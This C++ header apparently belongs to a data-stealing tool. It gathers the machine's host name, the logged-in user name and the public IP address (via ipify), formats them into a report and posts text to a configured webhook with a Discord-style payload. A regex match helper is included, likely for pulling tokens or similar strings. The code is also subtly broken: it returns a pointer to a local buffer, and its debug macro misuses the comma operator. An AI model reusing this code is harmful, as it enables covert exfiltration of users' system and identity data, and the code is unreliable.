#pragma once
#include "includes.h"

#define DbgPrint(...) std::cout , __VA_ARGS__

bool GetSystemQueryInformation(SystemQueryInformation_t* SysQueryInformation)
{
	DWORD size = sizeof(SysQueryInformation->host);
	::GetComputerNameA(SysQueryInformation->host, &size);

	size = sizeof(SysQueryInformation->local_user);
	::GetUserNameA(SysQueryInformation->local_user, &size);

	SysQueryInformation->inet_addr = cpr::Get(cpr::Url{ "https://api.ipify.org/?format=text" }).text;

	return true;
}

char* SysInformationCreateReport(SystemQueryInformation_t* query, BOOL formatted = TRUE)
{
	// TODO: extend this so that it is actually detailed...
	char report[512];

	sprintf(
		report, 
		"***Detailed computer statistics report***\n" \
		"Computer Host name: %s\n"  \
		"Current username: %s\n"	\
		"Internet Address: %s\n",
		query->host, query->local_user, query->inet_addr.c_str()
	);

	return report;
}

void SendWebhook(const std::string& text) {
	cpr::Response r = cpr::Post(cpr::Url{ Config::webhook },
		cpr::Payload{ {"content", text} });
}

std::vector<std::string> FindMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
}
